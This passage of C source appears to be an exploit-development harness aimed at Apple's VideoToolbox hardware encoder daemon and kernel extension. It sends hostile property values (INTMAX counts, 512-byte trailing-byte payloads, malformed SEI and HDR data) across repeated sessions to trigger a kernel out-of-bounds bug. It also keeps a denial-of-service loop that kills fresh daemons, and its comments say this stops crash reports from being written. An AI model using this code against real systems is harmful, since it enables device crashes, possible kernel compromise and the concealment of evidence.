         * daemon's input-scaling blitter (dissected pre-AVE). Variant codes (bits 0-3):
         * 1 = 420v8b-64, 2 = 420v10-64, 3 = 2vuy-256, 4 = 420v8b-256, 5 = 420v10-256,
         * 6 = 420v8b-32, 7 = 420v8b-64 PLANAR-BYTES (explicit 2-plane), 8 = 420v8b-64
         * IOSURFACE-BACKED (the real-app path), 9 = 420v8b-64 SESSION@64^2 (no
         * transfer chain), 10 = 420v8b-64 + ScalingMode=Trim, 11 = 420v8b-64 +
         * Letterbox, 12 = 2vuy-64 + Trim (scaling control); bit 8 (0x100) = usage 0.
         * The pb census line prints the client-side plane bases = the NULL-plane
         * oracle. */
        CFStringRef kUseV = CFStringCreateWithCString(kCFAllocatorDefault, "EncoderUsage", kCFStringEncodingUTF8);
        long uvv = (val & 0x100) ? 0 : 1;
        CFNumberRef nUseV = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &uvv);
        propStat = VTSessionSetProperty(sess, kUseV, nUseV);
        CFRelease(nUseV); CFRelease(kUseV);
    } else if (kind == DS_OPT_CENSUS) {
        /* v63: the forwardable-key census - VTSessionCopySupportedPropertyDictionary
         * dumps the client's supported property list (the keys VTSessionSetProperty
         * will forward to the daemon). PURE recon, client-side, zero daemon risk. */
        CFDictionaryRef sup = NULL;
        OSStatus cst = VTSessionCopySupportedPropertyDictionary(sess, &sup);
        if (cst != 0 || !sup) {
            dprintf(STDOUT_FILENO, "%s  I[%s] supported-dict: VTSessionCopySupportedPropertyDictionary=%d (dict %s)\n",
                    pfx, tag, (int)cst, sup ? "ok" : "nil");
        } else {
            CFIndex cn = CFDictionaryGetCount(sup);
            dprintf(STDOUT_FILENO, "%s  I[%s] supported-dict: %ld forwardable key(s) - the client's SetProperty surface:\n",
                    pfx, tag, (long)cn);
            CFStringRef *ks = (CFStringRef *)malloc(sizeof(CFStringRef) * (size_t)(cn ? cn : 1));
            if (ks) {
                CFDictionaryGetKeysAndValues(sup, (const void **)ks, NULL);
                for (CFIndex i = 0; i < cn; i++) {
                    char kb[192];
                    kb[0] = 0;
                    if (CFGetTypeID(ks[i]) == CFStringGetTypeID())
                        CFStringGetCString(ks[i], kb, sizeof(kb), kCFStringEncodingUTF8);
                    if (kb[0]) dprintf(STDOUT_FILENO, "%s      [%ld] %s\n", pfx, (long)i, kb);
                }
                /* v63: the per-target oracle - which of the OP03-13 keys are in the
                 * forwardable set. IN-LIST + a 0 receipt on its cell = delivered to
                 * the daemon; IN-LIST + -12900 = client-processed-but-rejected;
                 * BLOCKED + -12900 = never leaves the client (the interesting half). */
                dprintf(STDOUT_FILENO, "%s      -- v76 target keys --\n", pfx);
                for (int ti = 0; ti < 26; ti++) {
                    const char *tk = ds_opt_pub_key(ti);
                    if (!tk) continue;
                    CFStringRef tks = CFStringCreateWithCString(kCFAllocatorDefault, tk, kCFStringEncodingUTF8);
                    int inList = tks ? CFDictionaryContainsKey(sup, tks) : 0;
                    if (tks) CFRelease(tks);
                    dprintf(STDOUT_FILENO, "%s      [target %d] %s: %s\n", pfx, ti, tk,
                            inList ? "IN-LIST (forwardable)" : "BLOCKED (client dead-end)");
                }
                free(ks);
            }
            CFRelease(sup);
        }
    }
    if (kind == DS_OPT_USAGE_CHURN) {
        /* v69-v71: SESSION-CHURN - N sessions x 1 frame, full create -> set ->
         * encode -> destroy each. The v69 run (23:29, daemon 391) CRASHED the
         * daemon: launchd '(2, 11, 11)' = exit status 11 SIGSEGV x2 at 23:29:14.99/
         * 15.60, right after the 40-session churn (OP03 x8 + OP04 x24 + OP05 EWP-x8)
         * and DURING OP06/07 - the -1016 block-pool + 'AVE_SEI::Uninit SEI Frame # 0'
         * teardown leaks were the accumulation suspect; v70 EXONERATED the churn
         * (daemon 385 survived 40 clean sessions - the 420-FAMILY INPUT is the
         * trigger, single session). val: bit 0 = EnableWeighted-Prediction, bit 8 =
         * usage 0 (the clean-usage -1016 discriminator - otherwise usage 1 = the
         * -1015 USL fault path -> cb -17691 per frame), bit 12 (0x1000) = the
         * 420v8b-64 KILLER input rides each session (the v71 killer-churn). */
        CFStringRef kUseH = CFStringCreateWithCString(kCFAllocatorDefault, "EncoderUsage", kCFStringEncodingUTF8);
        CFStringRef kEWPH = CFStringCreateWithCString(kCFAllocatorDefault, "EnableWeightedPrediction", kCFStringEncodingUTF8);
        long uvh = (val & 0x100) ? 0 : 1;
        long ewpOn = val & 1;
        CFNumberRef nUseH = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &uvh);
        int nSess = (int)val2;
        if (nSess < 1) nSess = 1;
        if (nSess > 32) nSess = 32;
        int chSet0 = 0, chSet1 = 0, chFires = 0, chOk = 0, chErr = 0, chFr = 0;
        g_ave_fp_on = 0;   /* the churn's fp is from the LAST session - not meaningful */
        for (int s = 0; s < nSess; s++) {
            uint64_t tS0 = mach_absolute_time();   /* v73: per-session DoS-cadence clock */
            VTCompressionSessionRef cs = NULL;
            OSStatus cst = VTCompressionSessionCreate(NULL, 1920, 1080, kCMVideoCodecType_H264,
                                                      NULL, NULL, NULL, ave_out_cb, NULL, &cs);
            if (cst != 0 || !cs) { chSet0 = -999; break; }
            int p0 = VTSessionSetProperty(cs, kUseH, nUseH);
            chSet0 = p0;
            int p1 = 0;
            if (ewpOn) p1 = VTSessionSetProperty(cs, kEWPH, kCFBooleanTrue);
            chSet1 = p1;
            int wbase = g_ave_cb_fires, wobase = g_ave_cb_ok;
            g_ave_cb_err = 0;
            CVPixelBufferRef pb2 = NULL;
            uint8_t *bk2 = NULL;
            int inSize = 64;
            OSType inFmt = kCVPixelFormatType_422YpCbCr8;
            if (val & 0x1000) inFmt = kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange;   /* v71 killer-churn */
            size_t bpr2 = (inFmt == kCVPixelFormatType_422YpCbCr8) ? (size_t)inSize * 2 : (size_t)inSize;
            size_t len2 = (inFmt == kCVPixelFormatType_422YpCbCr8) ? (size_t)inSize * inSize * 2 : (size_t)inSize * inSize * 3 / 2;
            bk2 = malloc(len2);
            if (bk2) {
                memset(bk2, 0x41, len2);
                CVReturn cr2 = CVPixelBufferCreateWithBytes(NULL, inSize, inSize,
                                                            inFmt,
                                                            bk2, bpr2, NULL, NULL, NULL, &pb2);
                if (cr2 != 0) { free(bk2); bk2 = NULL; }
            }
            if (!pb2) {   /* v69: never push a NULL frame at the daemon - skip the session */
                if (bk2) free(bk2);
                VTCompressionSessionInvalidate(cs); CFRelease(cs);
                continue;
            }
            int es0 = -999;
            chFr = ds_ave_guard_run(^int {
                OSStatus a = VTCompressionSessionPrepareToEncodeFrames(cs);
                if (a != 0) return (int)a;
                return (int)VTCompressionSessionEncodeFrame(cs, pb2, CMTimeMake(0, 600),
                                                            CMTimeMake(1, 600), NULL, NULL, NULL);
            }, &es0);
            if (chFr == 0) {
                int es2b = -999;
                ds_ave_guard_run(^int { return (int)VTCompressionSessionCompleteFrames(cs, kCMTimeInvalid); }, &es2b);
                for (int i = 0; i < 60; i++) { usleep(200000); if (g_ave_cb_fires - wbase > 0) break; }
            }
            chFires += g_ave_cb_fires - wbase;
            chOk += g_ave_cb_ok - wobase;
            if (g_ave_cb_err != 0) chErr = (int)g_ave_cb_err;
            /* v73: the per-session DoS cadence - each killer session kills a FRESH
             * daemon; the death latency + err per session is the primitive receipt.
             * The -12912 annotation = the cb fired with the death artifact; a
             * no-callback death (daemon died before the cb -> session invalidated,
             * cb=0 err=0, slow) is flagged separately so it cannot be misread as a
             * slow clean session. */
            {
                int sErr = (int)g_ave_cb_err;
                int sMs = (int)ds_ave_elapsed_ms(tS0);
                int sFires = g_ave_cb_fires - wbase;
                const char *sTag = (sErr == -12912) ? " <- DAEMON DEATH (this session killed the fresh daemon)"
                    : (sErr == 0 && sFires == 0 && sMs > 5000) ? " <- probable death (no cb, session invalidated)"
                    : "";
                dprintf(STDOUT_FILENO, "%s    churn s%d/%d: cb=%d ok=%d err=%d fault=%d t=%dms%s\n",
                        pfx, s + 1, nSess, sFires, g_ave_cb_ok - wobase,
                        sErr, chFr, sMs, sTag);
            }
            if (pb2) CVBufferRelease(pb2);
            if (bk2) free(bk2);
            VTCompressionSessionInvalidate(cs); CFRelease(cs);
        }
        CFRelease(nUseH); CFRelease(kUseH); CFRelease(kEWPH);
        dprintf(STDOUT_FILENO, "%s  I[%s] usage-%ld churn x%d: sets=%d/%d cb fires=%d (ok=%d) err=%d fault=%d (v73 usage-churn - the v72 x4 run (00:48) PROVED the deterministic primitive: sessions killed 4 FRESH daemons (469/488/499/501) ~120-160ms after launch, each cb -12912; the x8 cell = the DoS cadence at scale + the 'Corpse failure, too many 6' forensics defeat (after ~6 rapid deaths the .ips reports STOP being generated = the DoS hides its own evidence - pid 410 got NO report); the per-session lines print the death latency per session; usage-0 (val bit 8) = the v69/v70 clean-usage discriminator: no -1016 lines = the leak is fault-path-specific (usage-1 only))\n",
                pfx, tag, uvh, nSess, chSet0, chSet1, chFires, chOk, chErr, chFr);
        ds_epoch_bump(pfx, tag);
        if (sess) { VTCompressionSessionInvalidate(sess); CFRelease(sess); }
        ds_journal_write("DONE", tag);
        usleep(300000);
        return;
    }
    if (kind == DS_OPT_UNGT_CHURN) {
        /* v76: the ESCALATION - InsertTrailingBytes=CFData{512} on x val2 FRESH
         * HEVC sessions (create -> set -> 1 frame -> destroy each). The v75 run
         * PROVED the field is DELIVERABLE + value-gated: CFData{1} = 0 DELIVERED,
         * CFData{65536} = -2004 'AVE_Prop_HEVC_SetInsertTrailingBytes:9329 0 <
         * size && size <= 512 | RPU is too long ... 65536 512' = the gate ceiling
         * is 512. v76 fires the MAX-LEGAL count 512 - it rides the kext's
         * '%%p %%lld InsertTrailingBytes %%d' Config marshal = the max attacker
         * count into the NAL emitter. The v72/v73 churn proved the kill cadence
         * (4-8 fresh daemons ~120-160ms each); this churn re-fires the deliverable
         * COUNT at that cadence - a PANIC on any session = THE 64747 kernel OOB. */
        long vv = 512L;                          /* v76: the (0,512] MAX-LEGAL CFData length - hardcoded: val2 = the SESSION COUNT only (never the payload length) */
        int nSess = (int)val2;
        if (nSess < 1) nSess = 1;
        if (nSess > 16) nSess = 16;
        int uSet0 = 0, uFires = 0, uOk = 0, uErr = 0, uFr = 0;
        g_ave_fp_on = 0;   /* the churn's fp is from the LAST session - not meaningful */
        for (int s = 0; s < nSess; s++) {
            uint64_t tS0 = mach_absolute_time();
            VTCompressionSessionRef cs = NULL;
            OSStatus cst = VTCompressionSessionCreate(NULL, 1920, 1080, kCMVideoCodecType_HEVC,
                                                      NULL, NULL, NULL, ave_out_cb, NULL, &cs);
            if (cst != 0 || !cs) { uSet0 = -999; break; }
            uint8_t *tbuf = (uint8_t *)malloc((size_t)vv);
            CFDataRef tdat = NULL;
            if (tbuf) {
                memset(tbuf, 0x5a, (size_t)vv);
                tdat = CFDataCreate(kCFAllocatorDefault, tbuf, (CFIndex)vv);
                free(tbuf);
            }
            if (!tdat) {
                uSet0 = -9999;
                dprintf(STDOUT_FILENO, "%s    ungt-churn s%d/%d: SKIPPED (CFData alloc failed)\n", pfx, s + 1, nSess);
                VTCompressionSessionInvalidate(cs); CFRelease(cs);
                continue;
            }
            uSet0 = VTSessionSetProperty(cs, CFSTR("InsertTrailingBytes"), tdat);
            CFRelease(tdat);
            int wbase = g_ave_cb_fires, wobase = g_ave_cb_ok;
            g_ave_cb_err = 0;
            CVPixelBufferRef pb2 = NULL;
            int inSize = 64;
            size_t bpr2 = (size_t)inSize * 2;
            size_t len2 = (size_t)inSize * inSize * 2;
            uint8_t *bk2 = (uint8_t *)malloc(len2);
            if (bk2) {
                memset(bk2, 0x41, len2);
                CVReturn cr2 = CVPixelBufferCreateWithBytes(NULL, inSize, inSize,
                                                            kCVPixelFormatType_422YpCbCr8,
                                                            bk2, bpr2, NULL, NULL, NULL, &pb2);
                if (cr2 != 0) { free(bk2); bk2 = NULL; }
            }
            if (!pb2) {   /* never push a NULL frame at the daemon - skip the session */
                if (bk2) free(bk2);
                VTCompressionSessionInvalidate(cs); CFRelease(cs);
                continue;
            }
            int es0 = -999;
            uFr = ds_ave_guard_run(^int {
                OSStatus a = VTCompressionSessionPrepareToEncodeFrames(cs);
                if (a != 0) return (int)a;
                return (int)VTCompressionSessionEncodeFrame(cs, pb2, CMTimeMake(0, 600),
                                                            CMTimeMake(1, 600), NULL, NULL, NULL);
            }, &es0);
            if (uFr == 0) {
                int es2b = -999;
                ds_ave_guard_run(^int { return (int)VTCompressionSessionCompleteFrames(cs, kCMTimeInvalid); }, &es2b);
                for (int i = 0; i < 60; i++) { usleep(200000); if (g_ave_cb_fires - wbase > 0) break; }
            }
            uFires += g_ave_cb_fires - wbase;
            uOk += g_ave_cb_ok - wobase;
            if (g_ave_cb_err != 0) uErr = (int)g_ave_cb_err;
            {
                int sErr = (int)g_ave_cb_err;
                int sMs = (int)ds_ave_elapsed_ms(tS0);
                int sFires = g_ave_cb_fires - wbase;
                const char *sTag = (sErr == -12912) ? " <- DAEMON DEATH (TrailingBytes CFData{512} killed this session)"
                    : (sErr == 0 && sFires == 0 && sMs > 5000) ? " <- probable death (no cb, session invalidated)"
                    : "";
                dprintf(STDOUT_FILENO, "%s    ungt-churn s%d/%d: cb=%d ok=%d err=%d fault=%d t=%dms%s\n",
                        pfx, s + 1, nSess, sFires, g_ave_cb_ok - wobase,
                        sErr, uFr, sMs, sTag);
            }
            if (pb2) CVBufferRelease(pb2);
            if (bk2) free(bk2);
            VTCompressionSessionInvalidate(cs); CFRelease(cs);
        }
        dprintf(STDOUT_FILENO, "%s  I[%s] InsertTrailingBytes=CFData{512} churn x%d: set=%d cb fires=%d (ok=%d) err=%d fault=%d (v76 escalation - each session rides the CFData length into the S_AVE_UCInParam_Config marshal on a FRESH daemon (correlate the AVE_Prop_HEVC_SetInsertTrailingBytes line); 0 = DELIVERED per session; -12900 + the 'wrong property type' ERR line = the type-gate held; a PANIC/reboot = THE 64747 kernel OOB; the 'Corpse failure, too many 6' forensics defeat after ~6 rapid deaths)\n",
                pfx, tag, nSess, uSet0, uFires, uOk, uErr, uFr);
        ds_epoch_bump(pfx, tag);
        if (sess) { VTCompressionSessionInvalidate(sess); CFRelease(sess); }
        ds_journal_write("DONE", tag);
        usleep(300000);
        return;
    }
    if (propStat != 0 && (kind == DS_OPT_DPB_REQ || kind == DS_OPT_USERDPB || kind == DS_OPT_DPB_REQ_AFTER))
        dprintf(STDOUT_FILENO, "%s  I[%s] session property set=%d (pre-encode pcVCP gate - AVE_Prop_AVC_SetDPBRequirements, DAEMON-side per v57)\n",
                pfx, tag, (int)propStat);
    if (kind == DS_OPT_AVE_PROP)
        dprintf(STDOUT_FILENO, "%s  I[%s] AVE prop set %s=%ld -> %d (0 = accepted - a getter may CLAMP, the 'AVE_Prop_AVC_Set%s' daemon line is the delivery proof; -12900 = key not in the daemon supported list; -17691/-1015 = plugin gate; a PANIC/reboot = the kext OOB = THE goal)\n",
                pfx, tag, ds_opt_ave_prop_key((int)val2) ? ds_opt_ave_prop_key((int)val2) : "?", val, (int)propStat, ds_opt_ave_prop_key((int)val2) ? ds_opt_ave_prop_key((int)val2) : "?");
    if (kind == DS_OPT_UNGT_NUM) {
        const char *kk = ds_opt_ungt_key((int)(val & 0xFF));
        dprintf(STDOUT_FILENO, "%s  I[%s] AVE prop set %s=%ld -> %d (v75 UNGT_NUM regression - the v74 run VERDICT: these numeric fields (MCTFEdgeCount etc.) NEVER forward via SetProperty (the daemon VT wrapper -12900 at VTCompressionSession.c:4958 with NO AVE_Prop line) - use the SPEC-dict cell; 0 here would be a shock = the channel reopened; -12900 = the expected dead channel; a PANIC/reboot = THE 64747 kernel OOB)\n",
                pfx, tag, kk ? kk : "?", val2, (int)propStat);
    }
    if (kind == DS_OPT_UNGT_DATA) {
        const char *kk = ds_opt_ungt_key((int)(val & 0xFF));
        const char *wid = ((val & 0xFF) == 2) ? "8 dwords (32B)" : ((val & 0xFF) == 3) ? "4 dwords (16B)" : ((val & 0xFF) == 7) ? "12+4+4+4 dwords (60B)" : "byte-count copy";
        dprintf(STDOUT_FILENO, "%s  I[%s] AVE prop set %s=CFData{%ldB} -> %d (v76 EXACT-WIDTH shot - the daemon exact-width validator passed (8B/4B/24B are the ONLY widths that reach the plugin setter); the kext copies at FIXED width (%s) and the plugin's gate decides: 0 = the payload RIDES the marshal (correlate the AVE_Prop_HEVC_Set<Field> daemon line + the encode = the fixed-copy OOB candidate enters the kext); -12900 + an AVE_Prop_*_Set<Field> ERR line naming a CF type (the v74 'CFDataGetTypeID() == CFGetTypeID(pValue) | wrong property type -2003' evidence) = the TYPE-gate held - re-fire with the right CF type; -12900 + NO daemon line = the key name is client-blocked (try the other name variant); an 'invalid ... size' FIG line = the length gate held; a PANIC/reboot = THE 64747 kernel OOB)\n",
                pfx, tag, kk ? kk : "?", val2, (int)propStat, wid);
    }
    if (kind == DS_OPT_UNGT_SPEC) {
        const char *kk = ds_opt_ungt_key((int)(val & 0xFF));
        dprintf(STDOUT_FILENO, "%s  I[%s] SPEC-dict %s=%ld (v76 SECOND-CHANCE channel RE-FIRE - no SetProperty: the value rides the create-time spec dict (forwarded verbatim per v57); the v74 run PROVED %s never forwards via SetProperty (the daemon VT wrapper -12900, no AVE_Prop line) - correlate the AVE_Prop_AVC_Set%s line on CREATE + the kext '%%p %%lld %s %%d' log = the channel opened; silent = the spec channel stays closed for the private fields (the v57 DPB precedent); a PANIC/reboot = THE 64747 kernel OOB)\n",
                pfx, tag, kk ? kk : "?", val2, kk ? kk : "?", kk ? kk : "?", kk ? kk : "?");
    }
    if (kind == DS_OPT_HDR_TRIPLE)
        dprintf(STDOUT_FILENO, "%s  I[%s] HDR TRIPLE AVE{8B}=%d CLL{4B}=%d MDCV{24B}=%d (v76 - the three EXACT-width legal payloads on ONE marshal; 0/0/0 = ALL THREE RIDE the S_AVE_UCInParam_Config (correlate the three AVE_Prop_HEVC_Set<HDR> daemon lines + the kext Data logs); -12902 on any = that validator's exact width held; a PANIC/reboot = THE 64747 kernel OOB)\n",
                pfx, tag, ds_hdr_trip[0], ds_hdr_trip[1], ds_hdr_trip[2]);
    if (kind == DS_OPT_SEI_REFEED) {
        const char *kk = ds_opt_ungt_key((int)(val & 0xFF));
        g_refeed_loops = 0;   /* v79: the compound-hammer loop count - set by bit 9 (0x400) below */
        if (val & 0x300) {
            dprintf(STDOUT_FILENO, "%s  I[%s] REFEED armed: %s%s=CFData{%ldB} -> HDR=%d TB=%d (v78 TB-COMPOUND - the hostile SEI AND 512 trailing bytes on ONE NAL: the compound shape the v77 run never fired (SEI-only refeeds all DECODED); HDR=the AVE8+CLL4+MDCV24 triple propStat, TB=the InsertTrailingBytes propStat - BOTH must be 0 for the full compound to ride; a decoder death/.ips here = the SEI+trailing compound parse OOB = THE v78 goal; a PANIC/reboot = THE 64747 kernel OOB)\n",
                    pfx, tag, "AVE{8}+CLL{4}+MDCV{24}+TB{512}", "", 0L, (int)propStat, ds_tb_comp);
        } else {
            dprintf(STDOUT_FILENO, "%s  I[%s] REFEED armed: %s%s=CFData{%ldB} -> %d (v77 SEI-REFEED - the full-output capture ON: the v76 fp PROOF (5a5a5a5a in the encoded sample) = OUR hostile SEI bytes ride the ACTUAL bitstream the daemon's decoder parses in the SELF-DECODE tail; 0 = the prop rides + the refeed runs; the REFEED self-decode receipt below = the decoder verdict - a daemon death/.ips there = the SEI-parse OOB on the DECODE half = THE v77 goal; a PANIC/reboot = THE 64747 kernel OOB)\n",
                    pfx, tag, (val & 0x100) ? "AVE{8}+CLL{4}+MDCV{24} (TRIPLE)" : (kk ? kk : "?"), (val & 0x100) ? "" : "", (val & 0x100) ? 0 : val2, (int)propStat);
        }
    }
    if (kind == DS_OPT_SEI_REFEED && (val & 0x400))
        dprintf(STDOUT_FILENO, "%s  I[%s] REFEED HAMMER armed: x%ld self-decodes of the compound NAL (v79 - the v78 run (09:35) VERDICT: the TB-COMPOUND NAL produced the FIRST-EVER decoder ERROR -12909 kVTVideoDecoderBadDataErr - v77's SEI-only refeeds all DECODED = the 512 trailing bytes demonstrably perturb the decoder NAL parse; the hammer repeats that bad-data parse x%ld = the decode-side crash escalation; a decoder .ips here = the compound parse OOB)\n",
                pfx, tag, (val2 > 0 && val2 <= 64) ? val2 : 8L, (val2 > 0 && val2 <= 64) ? val2 : 8L);
    if (kind == DS_OPT_TB_GRIND)
        dprintf(STDOUT_FILENO, "%s  I[%s] TB-GRIND: InsertTrailingBytes=CFData{512B} x%ld frames -> %d (v78 - the kext NAL emitter copies 512 trailing bytes PER FRAME = the repeated kernel copy; 0 = the count rides the Config marshal; a PANIC/reboot on the drain = THE 64747 kernel OOB)\n",
                pfx, tag, (val2 > 0 && val2 <= 32) ? val2 : 8L, (int)propStat);
    if (kind == DS_OPT_MCTF_ARM)
        dprintf(STDOUT_FILENO, "%s  I[%s] MCTF-ARM: EnableMCTF=true -> %d (v79 HEVC - the v78 arm was AVC where MCTF is use-time-blocked ('FIG: MCTF for AVC is not supported yet!'); HEVC = the REAL MCTF path = the INTMAX MCTFEdgeCount (create SPEC dict, one-sided 'iEdgeCnt >= 0' gate) hits the kext edge-sizing math; correlate AVE_Prop_HEVC_SetEnableMCTF + the kext '%%p %%lld MCTFEdgeCount %%d' log; a PANIC/reboot = THE 64747 kernel OOB)\n",
                pfx, tag, (int)propStat);
    if (kind == DS_OPT_MCTF_PARAMS)
        dprintf(STDOUT_FILENO, "%s  I[%s] MCTF-PARAMS: CFArray{%ld x %s} -> EnableMCTF=%d (v79 - the plugin's AVE_Prop_HEVC_SetMCTFParams parses the FLAT array (fixed-index GetChar/GetSInt16/GetSInt32, 30 x S_AVE_MCTF_Param 0x58B) into session+0x8C8 (flag +0x978); 0 = the WHOLE-ARRAY config rides the marshal = ALL 30 attacker strength slots reach the kext's MCTFStrengthLevel[%%d] reads (correlate the 'MCTF Params: 30 | ...' daemon log on CREATE); -12900 + no daemon line = the SPEC channel stays closed for MCTFParams; a PANIC/reboot = THE 64747 kernel OOB)\n",
                pfx, tag, (val2 > 0 && val2 <= 1024) ? val2 : 600L, (val == 1) ? "0x5a" : "INTMAX", (int)ds_mctf_params_stat);
    if (kind == DS_OPT_MCTF_STR)
        dprintf(STDOUT_FILENO, "%s  I[%s] MCTF-STR: MCTFStrengthLevel=%ld (SPEC) -> EnableMCTF=%d (v79 - the plugin setter gate is '0 <= iMCTFStrengthLevel && iMCTFStrengthLevel < 25' (AVE_Prop_AVC_SetMCTFStrengthLevel); correlate the kext '%%p %%lld MCTFStrengthLevel %%d' log; a PANIC/reboot = THE 64747 kernel OOB)\n",
                pfx, tag, val2, (int)ds_mctf_str_stat);
    if (kind == DS_OPT_MCTF_FMT) {
        long mch = (val >> 8) & 0xFF;
        long mf = val & 0xF;
        const char *fmtName = ds_opt_mctf_fmt_name(mf);   /* v82: the full DevCap table */
        const char *chName = (mch == 1) ? "MCTFParams" : (mch == 2) ? "MCTFStrengthLevel" : "MCTFEdgeCount";
        long chStat = (mch == 1) ? ds_mctf_params_stat : ds_mctf_str_stat;
        const char *mName = (val & 0x20) ? "PINNED->x420" : "NO-TX";
        dprintf(STDOUT_FILENO, "%s  I[%s] MCTF-FMT: %s %s@1920 ch=%s val=%ld -> EnableMCTF=%d VEPBA=%d noTX=%d (v81 - the v79 run (10:05) PROVED the MCTF config flips the session source format to 420v and AVE_ImgBuf_Verify REJECTS it pre-kernel ('pixel format is not supported 875704438' = -17691) = the INTMAX edge count never reached the kext; the FORMAT-FIX fires the same config on this format: ok=1 encode + NO ImgBuf error = the frame RIDES into the kext MCTF consumption (correlate the AVE_Prop_HEVC_Set<Field> line on CREATE + the kext '%%p %%lld MCTFEdgeCount / MCTFStrengthLevel %%d' logs); -17691 again = this format still gated; a PANIC/reboot = THE 64747 kernel OOB)\n",
                pfx, tag, fmtName, mName, chName, val2, (int)chStat, ds_mctf_vepba_stat, ds_mctf_notx_stat);
    }
    if (kind == DS_OPT_LA_GRIND || kind == DS_OPT_MKF_GRIND)
        dprintf(STDOUT_FILENO, "%s  I[%s] AVE prop set %s=%ld -> %d (v62 re-fire of a v61-ACCEPTED key - 0 = the hostile value rides the kernel-bound struct into the x%ld-frame grind; a PANIC/reboot on the drain = the kernel alloc OOB = THE goal)\n",
                pfx, tag, ds_opt_v62_key((int)kind), val, (int)propStat, (val2 > 0 && val2 <= 32) ? val2 : 1L);
    if (kind == DS_OPT_PUB_NUM || kind == DS_OPT_PUB_ARR || kind == DS_OPT_PUB_BOOL) {
        /* v65 receipt: the GATE-BOUNDARY shot verdict. The v64 daemon log PROVED the
         * client maps the plugin's -2004 to -12900 ('AVE_Plugin_AVC_SetProperty Exit
         * ... -2004 -12900'), so -12900 on a census-listed key = DELIVERED + value-
         * gated (the daemon line names the leaked bound), NOT client-blocked. 0 on a
         * boundary cell = the gate is one-sided / the value is the legal edge = it
         * RIDES the Configure marshal into the kext. */
        const char *kkey = ds_opt_pub_key((int)val2);
        if (kkey) {
            if (kind == DS_OPT_PUB_ARR)
                dprintf(STDOUT_FILENO, "%s  I[%s] AVE prop set %s={%ld,%ld} -> %d (v72 PUB shot - 0 = the value RIDES the Configure marshal into the kext (correlate the AVE_Prop_AVC_Set<Name> line); -12900 = the plugin's -2004 mapped through = delivered + value-gated (the daemon line names the leaked bound); -12900 + NO daemon line = truly client-blocked; a PANIC/reboot = THE 64747 kernel OOB)\n",
                        pfx, tag, kkey, val, val, (int)propStat);
            else if (kind == DS_OPT_PUB_BOOL)
                dprintf(STDOUT_FILENO, "%s  I[%s] AVE prop set %s=CFBooleanTrue -> %d (v72 PUB shot - 0 = the value RIDES the Configure marshal into the kext (correlate the AVE_Prop_AVC_Set<Name> line); -12900 = the plugin's -2004 mapped through = delivered + value-gated (the daemon line names the leaked bound); -12900 + NO daemon line = truly client-blocked; a PANIC/reboot = THE 64747 kernel OOB)\n",
                        pfx, tag, kkey, (int)propStat);
            else
                dprintf(STDOUT_FILENO, "%s  I[%s] AVE prop set %s=%ld -> %d (v72 PUB shot - 0 = the value RIDES the Configure marshal into the kext (correlate the AVE_Prop_AVC_Set<Name> line); -12900 = the plugin's -2004 mapped through = delivered + value-gated (the daemon line names the leaked bound); -12900 + NO daemon line = truly client-blocked; a PANIC/reboot = THE 64747 kernel OOB)\n",
                        pfx, tag, kkey, val, (int)propStat);
        }
    }
    if (kind == DS_OPT_PUB_GRIND || kind == DS_OPT_PUB_GRIND24) {
        /* v68 receipt: the DELIVERED-key grind verdict - 0 = the type-gate bypass
         * put the hostile value into the kernel-bound struct (StrictKeyFrameInterval
         * = the 8th hostile numeric key, v67 OP03 = 0) - the drain pushes the
         * strict-GOP interval math. DS_OPT_PUB_GRIND24 = the x24 deep drain. */
        const char *kkey = ds_opt_pub_key((int)val2);
        if (kkey) {
            if (kind == DS_OPT_PUB_GRIND24)
                dprintf(STDOUT_FILENO, "%s  I[%s] AVE prop set %s=%ld -> %d (v72 PUB grind24 - the x24 DEEP drain of the delivered StrictKeyFrameInterval=INTMAX (v67 OP03 = 0 = the type-gate bypass WORKED = the interval rides the kernel strict-GOP math; OP12 -1 = -2004 'iStrictKeyFrameInterval >= 0' = the clamp floor is 0 = the INTMAX TOP is the hostile end); a PANIC/reboot on the deep drain = THE 64747 kernel OOB)\n",
                            pfx, tag, kkey, val, (int)propStat);
            else
                dprintf(STDOUT_FILENO, "%s  I[%s] AVE prop set %s=%ld -> %d (v72 PUB grind - the x8 grind of the DELIVERED StrictKeyFrameInterval=INTMAX (v67 OP03 = 0 = the type-gate bypass worked - the 8th hostile numeric key rides the kernel strict-GOP interval math); -2004 = value-gated; a PANIC/reboot on the drain = THE 64747 kernel OOB)\n",
                        pfx, tag, kkey, val, (int)propStat);
        }
    }
    if (kind == DS_OPT_DATARATE)
        dprintf(STDOUT_FILENO, "%s  I[%s] AVE prop set DataRateLimits={INTMAX,%ld} -> %d (v65 OVERFLOW shape - v64's {INTMAX,1} rode clean (0, no FIG line); seconds=%ld = the int64 bitrate x seconds product is the overflow hypothesis - the hostile pair rides the Configure marshal into the x4 drain (a wrap depends on the daemon's int-vs-float math - correlate the VBV lines); a PANIC/reboot = the VBV size-math OOB = THE goal)\n",
                pfx, tag, (val2 > 0 && val2 <= 120) ? val2 : 1L, (int)propStat, (val2 > 0 && val2 <= 120) ? val2 : 1L);
    if (kind == DS_OPT_RC_PAIR)
        dprintf(STDOUT_FILENO, "%s  I[%s] AVE prop set SoftMin=%ld -> %d | SoftMax=%ld -> %d (v66 RCQPRANGE pair - the two-gate split shot: 0/0 = BOTH rode the Configure marshal (a -1001/-12902 Prepare receipt below = they passed the prop gates but tripped the session RCQPRange validator = the deepest reach); -2004 on either = the formula gate held; a PANIC/reboot = THE 64747 kernel OOB)\n",
                pfx, tag, val, (int)propStat, val2, (int)propStat2);
    if (kind == DS_OPT_PPS_ARR)
        dprintf(STDOUT_FILENO, "%s  I[%s] AVE prop set UserParameterSetsIds=CFArray{%ld x %d} -> %d (v72 PPS-count shot - the count gate [0,9] (v66 leak, v67 re-confirmed) passes %ld elements; -12900 + the 'UserParameterSetIdsCount' line = count-gated (the kernel never sees the array); 0 = the count rode the marshal (v67 OP08/09 count-9 = 0 with the cb fires=2 double-fire on 'Forcing the PPS count to 1' is the receipt); a PANIC/reboot = the kernel PPS-table OOB = THE goal)\n",
                pfx, tag, val, (int)val2, (int)propStat, val);
    if (kind == DS_OPT_PPS_GRIND)
